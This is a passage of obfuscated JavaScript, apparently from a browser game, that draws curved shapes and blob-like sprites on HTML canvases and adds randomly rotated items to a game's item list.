			Δ.bezierCurveTo(437.0113830566406 * ᐃ, 301.2670593261719 * ᐃ, ᐃ * 437.0113830566406, ᐃ * 301.2670593261719, ᐃ * 474.0113830566406, 311.7670593261719 * ᐃ);
			Δ.bezierCurveTo(484.0113830566406 * ᐃ, 319.7670593261719 * ᐃ, 481.0113830566406 * ᐃ, ᐃ * 322.7670593261719, 474.0113830566406 * ᐃ, 335.7670593261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 465.5113830566406, ᐃ * 354.7670593261719, ᐃ * 465.5113830566406, 354.7670593261719 * ᐃ, ᐃ * 457.0113830566406, 373.7670593261719 * ᐃ);
			Δ.bezierCurveTo(449.0113830566406 * ᐃ, 386.7670593261719 * ᐃ, 444.0113830566406 * ᐃ, 384.7670593261719 * ᐃ, 427.0113830566406 * ᐃ, 370.7670593261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 403.0113830566406, ᐃ * 354.7670593261719, 403.0113830566406 * ᐃ, 354.7670593261719 * ᐃ, 379.0113830566406 * ᐃ, 338.7670593261719 * ᐃ);
			Δ.bezierCurveTo(371.0113830566406 * ᐃ, ᐃ * 327.7670593261719, 373.0113830566406 * ᐃ, 323.7670593261719 * ᐃ, 377.0113830566406 * ᐃ, 313.7670593261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 386.0113830566406, 292.7670593261719 * ᐃ, ᐃ * 393.0113830566406, ᐃ * 288.7670593261719, 398.0113830566406 * ᐃ, 291.7670593261719 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆΔᐃ], Ⲇᐃ[ᐃⵠⲆⲆⲆ], ᐃ * 12);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(0, ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 366.0113830566406, 361.2216033935547 * ᐃ);
			Δ.bezierCurveTo(393.0113830566406 * ᐃ, ᐃ * 383.2216033935547, 393.0113830566406 * ᐃ, 383.2216033935547 * ᐃ, ᐃ * 420.0113830566406, ᐃ * 405.2216033935547);
			Δ.bezierCurveTo(427.0113830566406 * ᐃ, 414.2216033935547 * ᐃ, ᐃ * 425.0113830566406, 417.2216033935547 * ᐃ, ᐃ * 413.0113830566406, 428.2216033935547 * ᐃ);
			Δ.bezierCurveTo(405.5113830566406 * ᐃ, ᐃ * 435.2216033935547, ᐃ * 405.5113830566406, 435.2216033935547 * ᐃ, 398.0113830566406 * ᐃ, ᐃ * 442.2216033935547);
			Δ.bezierCurveTo(388.0113830566406 * ᐃ, 451.2216033935547 * ᐃ, ᐃ * 385.0113830566406, ᐃ * 445.2216033935547, 373.0113830566406 * ᐃ, ᐃ * 428.2216033935547);
			Δ.bezierCurveTo(ᐃ * 358.5113830566406, ᐃ * 408.2216033935547, 358.5113830566406 * ᐃ, 408.2216033935547 * ᐃ, 344.0113830566406 * ᐃ, 388.2216033935547 * ᐃ);
			Δ.bezierCurveTo(337.0113830566406 * ᐃ, ᐃ * 378.2216033935547, ᐃ * 342.0113830566406, 377.2216033935547 * ᐃ, 347.0113830566406 * ᐃ, ᐃ * 371.2216033935547);
			Δ.bezierCurveTo(359.0113830566406 * ᐃ, ᐃ * 359.2216033935547, ᐃ * 361.0113830566406, 358.2216033935547 * ᐃ, 364.0113830566406 * ᐃ, ᐃ * 361.2216033935547);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], 12 * ᐃ);
			Δ.globalAlpha = 1;
			Δ.translate(0, ᐃ * -ⵠᐃⲆΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(ᐃ * 366.0113830566406, 361.2216033935547 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 393.0113830566406, 383.2216033935547 * ᐃ, ᐃ * 393.0113830566406, ᐃ * 383.2216033935547, 420.0113830566406 * ᐃ, 405.2216033935547 * ᐃ);
			Δ.bezierCurveTo(427.0113830566406 * ᐃ, ᐃ * 414.2216033935547, ᐃ * 425.0113830566406, 417.2216033935547 * ᐃ, 413.0113830566406 * ᐃ, 428.2216033935547 * ᐃ);
			Δ.bezierCurveTo(405.5113830566406 * ᐃ, ᐃ * 435.2216033935547, ᐃ * 405.5113830566406, 435.2216033935547 * ᐃ, 398.0113830566406 * ᐃ, 442.2216033935547 * ᐃ);
			Δ.bezierCurveTo(388.0113830566406 * ᐃ, 451.2216033935547 * ᐃ, ᐃ * 385.0113830566406, 445.2216033935547 * ᐃ, 373.0113830566406 * ᐃ, 428.2216033935547 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 358.5113830566406, 408.2216033935547 * ᐃ, ᐃ * 358.5113830566406, 408.2216033935547 * ᐃ, 344.0113830566406 * ᐃ, 388.2216033935547 * ᐃ);
			Δ.bezierCurveTo(337.0113830566406 * ᐃ, ᐃ * 378.2216033935547, ᐃ * 342.0113830566406, 377.2216033935547 * ᐃ, 347.0113830566406 * ᐃ, 371.2216033935547 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 359.0113830566406, 359.2216033935547 * ᐃ, 361.0113830566406 * ᐃ, ᐃ * 358.2216033935547, 364.0113830566406 * ᐃ, ᐃ * 361.2216033935547);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[2], ⵠΔᐃΔⵠⲆⵠ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ΔᐃᐃⲆ;
			Δ.translate(ΔᐃΔΔ, ⵠⵠᐃⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 323.0113830566406, 393.2216033935547 * ᐃ);
			Δ.bezierCurveTo(338.0113830566406 * ᐃ, 424.7216033935547 * ᐃ, ᐃ * 338.0113830566406, 424.7216033935547 * ᐃ, 353.0113830566406 * ᐃ, ᐃ * 456.2216033935547);
			Δ.bezierCurveTo(355.0113830566406 * ᐃ, ᐃ * 467.2216033935547, 354.0113830566406 * ᐃ, ᐃ * 469.2216033935547, ᐃ * 336.0113830566406, 475.2216033935547 * ᐃ);
			Δ.bezierCurveTo(326.0113830566406 * ᐃ, 478.2216033935547 * ᐃ, ᐃ * 326.0113830566406, ᐃ * 478.2216033935547, ᐃ * 316.0113830566406, 481.2216033935547 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 304.0113830566406, ᐃ * 484.2216033935547, 304.0113830566406 * ᐃ, ᐃ * 477.2216033935547, ᐃ * 301.0113830566406, 454.2216033935547 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 295.5113830566406, 429.2216033935547 * ᐃ, ᐃ * 295.5113830566406, ᐃ * 429.2216033935547, ᐃ * 290.0113830566406, 404.2216033935547 * ᐃ);
			Δ.bezierCurveTo(287.0113830566406 * ᐃ, 396.2216033935547 * ᐃ, ᐃ * 297.0113830566406, 394.2216033935547 * ᐃ, 303.0113830566406 * ᐃ, ᐃ * 392.2216033935547);
			Δ.bezierCurveTo(316.0113830566406 * ᐃ, 387.2216033935547 * ᐃ, 318.0113830566406 * ᐃ, 387.2216033935547 * ᐃ, ᐃ * 323.0113830566406, ᐃ * 394.2216033935547);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔⲆⵠⲆ], ᐃ * 12);
			Δ.globalAlpha = 1;
			Δ.translate(0, ᐃ * -5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(ᐃ * 323.0113830566406, ᐃ * 393.2216033935547);
			Δ.bezierCurveTo(338.0113830566406 * ᐃ, 424.7216033935547 * ᐃ, 338.0113830566406 * ᐃ, 424.7216033935547 * ᐃ, 353.0113830566406 * ᐃ, 456.2216033935547 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 355.0113830566406, 467.2216033935547 * ᐃ, 354.0113830566406 * ᐃ, 469.2216033935547 * ᐃ, ᐃ * 336.0113830566406, 475.2216033935547 * ᐃ);
			Δ.bezierCurveTo(326.0113830566406 * ᐃ, ᐃ * 478.2216033935547, 326.0113830566406 * ᐃ, 478.2216033935547 * ᐃ, ᐃ * 316.0113830566406, ᐃ * 481.2216033935547);
			Δ.bezierCurveTo(304.0113830566406 * ᐃ, ᐃ * 484.2216033935547, 304.0113830566406 * ᐃ, 477.2216033935547 * ᐃ, ᐃ * 301.0113830566406, ᐃ * 454.2216033935547);
			Δ.bezierCurveTo(295.5113830566406 * ᐃ, ᐃ * 429.2216033935547, 295.5113830566406 * ᐃ, 429.2216033935547 * ᐃ, 290.0113830566406 * ᐃ, 404.2216033935547 * ᐃ);
			Δ.bezierCurveTo(287.0113830566406 * ᐃ, ᐃ * 396.2216033935547, 297.0113830566406 * ᐃ, ᐃ * 394.2216033935547, ᐃ * 303.0113830566406, 392.2216033935547 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 316.0113830566406, ᐃ * 387.2216033935547, ᐃ * 318.0113830566406, 387.2216033935547 * ᐃ, ᐃ * 323.0113830566406, ᐃ * 394.2216033935547);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⵠᐃⲆ], Ⲇᐃ[ⲆΔΔⵠ], 12 * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ΔΔᐃⵠ;
			Δ.translate(0, ᐃ * ᐃⲆⵠⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(270.0113830566406 * ᐃ, 413.2216033935547 * ᐃ);
			Δ.bezierCurveTo(271.0113830566406 * ᐃ, 445.7216033935547 * ᐃ, ᐃ * 271.0113830566406, 445.7216033935547 * ᐃ, ᐃ * 272.0113830566406, ᐃ * 478.2216033935547);
			Δ.bezierCurveTo(ᐃ * 273.0113830566406, 490.2216033935547 * ᐃ, ᐃ * 267.0113830566406, ᐃ * 493.2216033935547, ᐃ * 249.01138305664062, ᐃ * 490.2216033935547);
			Δ.bezierCurveTo(222.01138305664062 * ᐃ, 492.2216033935547 * ᐃ, 220.01138305664062 * ᐃ, 485.2216033935547 * ᐃ, ᐃ * 225.01138305664062, ᐃ * 467.2216033935547);
			Δ.bezierCurveTo(ᐃ * 230.51138305664062, 440.2216033935547 * ᐃ, 230.51138305664062 * ᐃ, ᐃ * 440.2216033935547, 236.01138305664062 * ᐃ, ᐃ * 413.2216033935547);
			Δ.bezierCurveTo(237.01138305664062 * ᐃ, 405.2216033935547 * ᐃ, 238.01138305664062 * ᐃ, ᐃ * 404.2216033935547, ᐃ * 253.01138305664062, 403.2216033935547 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 269.0113830566406, ᐃ * 405.2216033935547, 270.0113830566406 * ᐃ, ᐃ * 407.2216033935547, ᐃ * 269.0113830566406, ᐃ * 412.2216033935547);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], ᐃ * ΔᐃΔⵠⵠ);
			Δ.globalAlpha = ᐃᐃⵠ;
			Δ.translate(ⵠⲆⲆ, ᐃ * -ᐃΔΔΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 270.0113830566406, 413.2216033935547 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 271.0113830566406, ᐃ * 445.7216033935547, 271.0113830566406 * ᐃ, ᐃ * 445.7216033935547, 272.0113830566406 * ᐃ, ᐃ * 478.2216033935547);
			Δ.bezierCurveTo(273.0113830566406 * ᐃ, ᐃ * 490.2216033935547, ᐃ * 267.0113830566406, 493.2216033935547 * ᐃ, 249.01138305664062 * ᐃ, 490.2216033935547 * ᐃ);
			Δ.bezierCurveTo(222.01138305664062 * ᐃ, 492.2216033935547 * ᐃ, ᐃ * 220.01138305664062, 485.2216033935547 * ᐃ, 225.01138305664062 * ᐃ, ᐃ * 467.2216033935547);
			Δ.bezierCurveTo(ᐃ * 230.51138305664062, ᐃ * 440.2216033935547, 230.51138305664062 * ᐃ, 440.2216033935547 * ᐃ, 236.01138305664062 * ᐃ, 413.2216033935547 * ᐃ);
			Δ.bezierCurveTo(237.01138305664062 * ᐃ, 405.2216033935547 * ᐃ, 238.01138305664062 * ᐃ, ᐃ * 404.2216033935547, 253.01138305664062 * ᐃ, 403.2216033935547 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 269.0113830566406, ᐃ * 405.2216033935547, 270.0113830566406 * ᐃ, 407.2216033935547 * ᐃ, ᐃ * 269.0113830566406, 412.2216033935547 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ⲆⵠΔΔ], ⲆⲆΔΔⵠΔⲆ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(0, ᐃ * ⵠⵠᐃⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(ᐃ * 207.01138305664062, 406.2216033935547 * ᐃ);
			Δ.bezierCurveTo(197.51138305664062 * ᐃ, 440.7216033935547 * ᐃ, ᐃ * 197.51138305664062, 440.7216033935547 * ᐃ, 188.01138305664062 * ᐃ, 475.2216033935547 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 184.01138305664062, ᐃ * 485.2216033935547, ᐃ * 179.01138305664062, ᐃ * 491.2216033935547, ᐃ * 152.01138305664062, 477.2216033935547 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 136.51138305664062, 469.7216033935547 * ᐃ, ᐃ * 136.51138305664062, ᐃ * 469.7216033935547, ᐃ * 121.01138305664062, ᐃ * 462.2216033935547);
			Δ.bezierCurveTo(109.01138305664062 * ᐃ, 453.2216033935547 * ᐃ, ᐃ * 117.01138305664062, 447.2216033935547 * ᐃ, 133.01138305664062 * ᐃ, ᐃ * 427.2216033935547);
			Δ.bezierCurveTo(ᐃ * 146.51138305664062, ᐃ * 406.7216033935547, 146.51138305664062 * ᐃ, 406.7216033935547 * ᐃ, ᐃ * 160.01138305664062, ᐃ * 386.2216033935547);
			Δ.bezierCurveTo(163.01138305664062 * ᐃ, ᐃ * 377.2216033935547, 168.01138305664062 * ᐃ, ᐃ * 378.2216033935547, ᐃ * 187.01138305664062, ᐃ * 387.2216033935547);
			Δ.bezierCurveTo(206.01138305664062 * ᐃ, ᐃ * 395.2216033935547, ᐃ * 208.01138305664062, ᐃ * 398.2216033935547, ᐃ * 207.01138305664062, 405.2216033935547 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], ᐃ * ⵠⵠᐃΔⵠᐃᐃ);
			Δ.globalAlpha = 1;
			Δ.translate(0, ᐃ * -5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(207.01138305664062 * ᐃ, ᐃ * 406.2216033935547);
			Δ.bezierCurveTo(197.51138305664062 * ᐃ, 440.7216033935547 * ᐃ, 197.51138305664062 * ᐃ, 440.7216033935547 * ᐃ, ᐃ * 188.01138305664062, 475.2216033935547 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 184.01138305664062, ᐃ * 485.2216033935547, ᐃ * 179.01138305664062, 491.2216033935547 * ᐃ, ᐃ * 152.01138305664062, 477.2216033935547 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 136.51138305664062, 469.7216033935547 * ᐃ, 136.51138305664062 * ᐃ, 469.7216033935547 * ᐃ, 121.01138305664062 * ᐃ, 462.2216033935547 * ᐃ);
			Δ.bezierCurveTo(109.01138305664062 * ᐃ, ᐃ * 453.2216033935547, 117.01138305664062 * ᐃ, ᐃ * 447.2216033935547, 133.01138305664062 * ᐃ, 427.2216033935547 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 146.51138305664062, ᐃ * 406.7216033935547, 146.51138305664062 * ᐃ, ᐃ * 406.7216033935547, 160.01138305664062 * ᐃ, ᐃ * 386.2216033935547);
			Δ.bezierCurveTo(163.01138305664062 * ᐃ, ᐃ * 377.2216033935547, ᐃ * 168.01138305664062, ᐃ * 378.2216033935547, ᐃ * 187.01138305664062, ᐃ * 387.2216033935547);
			Δ.bezierCurveTo(ᐃ * 206.01138305664062, 395.2216033935547 * ᐃ, ᐃ * 208.01138305664062, ᐃ * 398.2216033935547, ᐃ * 207.01138305664062, 405.2216033935547 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[Ⲇᐃᐃⵠ], ΔΔΔᐃᐃⲆᐃ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ⵠΔᐃ;
			Δ.translate(ⵠΔⲆⵠ, ᐃ * ᐃᐃⲆᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(ᐃ * 130.01138305664062, ᐃ * 375.2216033935547);
			Δ.bezierCurveTo(109.51138305664062 * ᐃ, 400.7216033935547 * ᐃ, ᐃ * 109.51138305664062, ᐃ * 400.7216033935547, 89.01138305664062 * ᐃ, ᐃ * 426.2216033935547);
			Δ.bezierCurveTo(ᐃ * 82.01138305664062, 435.2216033935547 * ᐃ, ᐃ * 77.01138305664062, 435.2216033935547 * ᐃ, 62.011383056640625 * ᐃ, ᐃ * 417.2216033935547);
			Δ.bezierCurveTo(ᐃ * 43.011383056640625, 397.2216033935547 * ᐃ, 47.011383056640625 * ᐃ, ᐃ * 395.2216033935547, ᐃ * 62.011383056640625, ᐃ * 382.2216033935547);
			Δ.bezierCurveTo(84.01138305664062 * ᐃ, 366.7216033935547 * ᐃ, ᐃ * 84.01138305664062, 366.7216033935547 * ᐃ, 106.01138305664062 * ᐃ, ᐃ * 351.2216033935547);
			Δ.bezierCurveTo(ᐃ * 116.01138305664062, 344.2216033935547 * ᐃ, 120.01138305664062 * ᐃ, ᐃ * 347.2216033935547, 127.01138305664062 * ᐃ, ᐃ * 356.2216033935547);
			Δ.bezierCurveTo(ᐃ * 137.01138305664062, 366.2216033935547 * ᐃ, 137.01138305664062 * ᐃ, 366.2216033935547 * ᐃ, ᐃ * 131.01138305664062, 376.2216033935547 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], ᐃᐃΔᐃⲆ * ᐃ);
			Δ.globalAlpha = 1;
			Δ.translate(ᐃⵠⲆ, -ⵠᐃⲆΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(130.01138305664062 * ᐃ, ᐃ * 375.2216033935547);
			Δ.bezierCurveTo(ᐃ * 109.51138305664062, 400.7216033935547 * ᐃ, 109.51138305664062 * ᐃ, 400.7216033935547 * ᐃ, 89.01138305664062 * ᐃ, 426.2216033935547 * ᐃ);
			Δ.bezierCurveTo(82.01138305664062 * ᐃ, 435.2216033935547 * ᐃ, 77.01138305664062 * ᐃ, ᐃ * 435.2216033935547, ᐃ * 62.011383056640625, 417.2216033935547 * ᐃ);
			Δ.bezierCurveTo(43.011383056640625 * ᐃ, ᐃ * 397.2216033935547, ᐃ * 47.011383056640625, ᐃ * 395.2216033935547, 62.011383056640625 * ᐃ, 382.2216033935547 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 84.01138305664062, ᐃ * 366.7216033935547, 84.01138305664062 * ᐃ, 366.7216033935547 * ᐃ, 106.01138305664062 * ᐃ, ᐃ * 351.2216033935547);
			Δ.bezierCurveTo(ᐃ * 116.01138305664062, ᐃ * 344.2216033935547, ᐃ * 120.01138305664062, 347.2216033935547 * ᐃ, 127.01138305664062 * ᐃ, 356.2216033935547 * ᐃ);
			Δ.bezierCurveTo(137.01138305664062 * ᐃ, ᐃ * 366.2216033935547, 137.01138305664062 * ᐃ, 366.2216033935547 * ᐃ, ᐃ * 131.01138305664062, 376.2216033935547 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[2], ⵠΔᐃΔᐃ * ᐃ);
			return Ⲇⵠ
		}

		function ⵠᐃᐃᐃⲆᐃⵠΔⵠ(ᐃ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			if (Δᐃᐃᐃ == ⵠᐃ) {
				Ⲇⵠ.width = ᐃ * 543;
				Ⲇⵠ.height = ᐃ * 393;
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
				Δ.moveTo(164.23297119140625 * ᐃ, ᐃ * 72.80398559570312);
				Δ.bezierCurveTo(289.23297119140625 * ᐃ, 41.803985595703125 * ᐃ, ᐃ * 413.23297119140625, ᐃ * 86.80398559570312, 441.23297119140625 * ᐃ, ᐃ * 105.80398559570312);
				Δ.bezierCurveTo(ᐃ * 513.2329711914062, 149.80398559570312 * ᐃ, 475.23297119140625 * ᐃ, ᐃ * 224.80398559570312, ᐃ * 451.23297119140625, ᐃ * 258.8039855957031);
				Δ.bezierCurveTo(410.23297119140625 * ᐃ, 315.8039855957031 * ᐃ, ᐃ * 380.23297119140625, 314.8039855957031 * ᐃ, 289.23297119140625 * ᐃ, 320.8039855957031 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 160.23297119140625, ᐃ * 329.8039855957031, 102.23297119140625 * ᐃ, ᐃ * 312.8039855957031, 72.23297119140625 * ᐃ, ᐃ * 258.8039855957031);
				Δ.bezierCurveTo(32.23297119140625 * ᐃ, 156.80398559570312 * ᐃ, ᐃ * 93.23297119140625, ᐃ * 92.80398559570312, 164.23297119140625 * ᐃ, 72.80398559570312 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆⵠ])
			} else if (1 == ⵠᐃ) {
				Ⲇⵠ.width = ᐃ * 543;
				Ⲇⵠ.height = ᐃ * 470;
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
				Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
				Δ.moveTo(ᐃ * 238.23297119140625, ᐃ * 34.622161865234375);
				Δ.bezierCurveTo(ᐃ * 423.23297119140625, 21.622161865234375 * ᐃ, 474.23297119140625 * ᐃ, ᐃ * 96.62216186523438, ᐃ * 499.23297119140625, 167.62216186523438 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 536.2329711914062, 288.6221618652344 * ᐃ, 487.23297119140625 * ᐃ, 367.6221618652344 * ᐃ, ᐃ * 403.23297119140625, 412.6221618652344 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 287.23297119140625, ᐃ * 466.6221618652344, ᐃ * 127.23297119140625, ᐃ * 424.6221618652344, 50.23297119140625 * ᐃ, ᐃ * 318.6221618652344);
				Δ.bezierCurveTo(ᐃ * -.76702880859375, ᐃ * 239.62216186523438, 30.23297119140625 * ᐃ, ᐃ * 110.62216186523438, 73.23297119140625 * ᐃ, 77.62216186523438 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 128.23297119140625, ᐃ * 29.622161865234375, ᐃ * 202.23297119140625, ᐃ * 40.622161865234375, ᐃ * 238.23297119140625, ᐃ * 34.622161865234375);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0])
			} else {
				Ⲇⵠ.width = ᐃ * 543;
				Ⲇⵠ.height = ᐃ * 470;
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔⲆΔΔ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(268.23297119140625 * ᐃ, ᐃ * 23.349441528320312);
				Δ.bezierCurveTo(424.23297119140625 * ᐃ, ᐃ * -.6505584716796875, 524.2329711914062 * ᐃ, ᐃ * 44.34944152832031, 519.2329711914062 * ᐃ, ᐃ * 186.3494415283203);
				Δ.bezierCurveTo(ᐃ * 515.2329711914062, ᐃ * 341.3494415283203, 431.23297119140625 * ᐃ, ᐃ * 409.3494415283203, 357.23297119140625 * ᐃ, ᐃ * 442.3494415283203);
				Δ.bezierCurveTo(ᐃ * 278.23297119140625, ᐃ * 469.3494415283203, 144.23297119140625 * ᐃ, ᐃ * 460.3494415283203, 51.23297119140625 * ᐃ, ᐃ * 348.3494415283203);
				Δ.bezierCurveTo(3.23297119140625 * ᐃ, ᐃ * 274.3494415283203, ᐃ * 45.23297119140625, ᐃ * 87.34944152832031, ᐃ * 268.23297119140625, 23.349441528320312 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ])
			}
			return Ⲇⵠ
		}

		function ΔⵠᐃⲆᐃᐃΔᐃⲆ() {
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[406]).style.backgroundColor = Ⲇ.ⲆⵠΔⲆᐃ[ΔⵠⵠᐃΔ.time];
			ΔⵠⵠᐃΔ.items.push(new ΔⲆⵠΔΔⲆⵠ(ⲆⲆᐃ.ⵠⲆΔᐃΔ, 0, 0, 0, 0, Math.random() * Math.PI * 2, ⵠⵠΔⲆ, 1));
			ΔⵠⵠᐃΔ.items.push(new ΔⲆⵠΔΔⲆⵠ(ⲆⲆᐃ.ⲆⲆΔΔᐃ, ⵠⲆᐃⵠ, ΔⲆⵠⲆ, ΔΔⵠⵠ, ⲆΔⵠ, ⲆΔⵠ, ᐃⵠⲆⵠ, 5));
			ΔⵠⵠᐃΔ.items.push(new ΔⲆⵠΔΔⲆⵠ(ⲆⲆᐃ.ᐃⲆⲆΔᐃ, ⲆⲆⲆᐃ, Ⲇᐃⵠⵠ, Ⲇᐃⵠⵠ, ΔⲆⲆ, Math.PI / Ⲇᐃⵠᐃ, 0, 0));
			ΔⵠⵠᐃΔ.items.push(new ΔⲆⵠΔΔⲆⵠ(ⲆⲆᐃ.ⲆⲆΔΔᐃ, Δᐃᐃᐃ, Ⲇᐃⵠⵠ, 0, 0, 0, ᐃⵠΔ, 5))
		}

		function ⲆᐃΔᐃΔᐃⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 170;
			Ⲇⵠ.height = ᐃ * 200;
			Δ.translate(ᐃ * ΔⲆΔΔ, ᐃ * 15);
			if (ⵠⲆΔ == ⵠᐃ) {
				Δ.translate(0, ᐃ * -5);
				ⵠᐃᐃ(Δ, 77.00003051757812 * ᐃ, ᐃ * 104.49432373046875, 71.84010022264724 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔⵠΔ], Ⲇᐃ[5], ᐃ * ⲆΔⲆⲆΔ);
				ⵠᐃᐃ(Δ, 77.00003051757812 * ᐃ, 104.22160339355469 * ᐃ, ᐃ * 61.554853586049575);
				ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠ], Ⲇᐃ[5], ᐃ * 20);
				Δ.save();
				Δ.translate(ᐃ * 77.00003051757812, 31.267044067382812 * ᐃ);
				Ⲇᐃᐃ(Δ, -ⵠⲆⵠⲆΔ * ᐃ, ᐃ * -12.5, ᐃ * 12, ᐃ * 25, ᐃ * ᐃΔᐃΔⲆ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[5], ⵠⲆⲆⲆⲆ * ᐃ);
				Δ.save();
				Δ.translate(77.00003051757812 * ᐃ, 13.267044067382812 * ᐃ);
				Ⲇᐃᐃ(Δ, -15 * ᐃ, ᐃ * -10.5, ᐃ * 30, ᐃ * 21, ᐃ * ⲆⵠⲆⵠⲆ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[5], ᐃ * ⵠⵠΔΔᐃ)
			}
			ⵠᐃᐃ(Δ, 77.00003051757812 * ᐃ, ᐃ * 104.49432373046875, ᐃ * 71.84010022264724);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⵠⵠⵠΔ], ᐃ * 7);
			ⵠᐃᐃ(Δ, 77.00003051757812 * ᐃ, ᐃ * 104.22160339355469, 61.554853586049575 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ᐃⵠⲆⲆⲆ], ᐃ * 7);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(18.000030517578125 * ᐃ, 105.85795593261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 134.00003051757812, 104.85795593261719 * ᐃ, 77.00003051757812 * ᐃ, ᐃ * 104.85795593261719, ᐃ * 136.00003051757812, ᐃ * 103.85795593261719);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠ], Ⲇᐃ[2], ᐃ * ΔⵠⲆᐃⲆ);
			ⵠᐃᐃ(Δ, ᐃ * 77.00003051757812, 104.6761474609375 * ᐃ, 32.55764119219941 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠ], Ⲇᐃ[2], ⵠⲆΔⵠᐃ * ᐃ);
			Δ.beginPath();
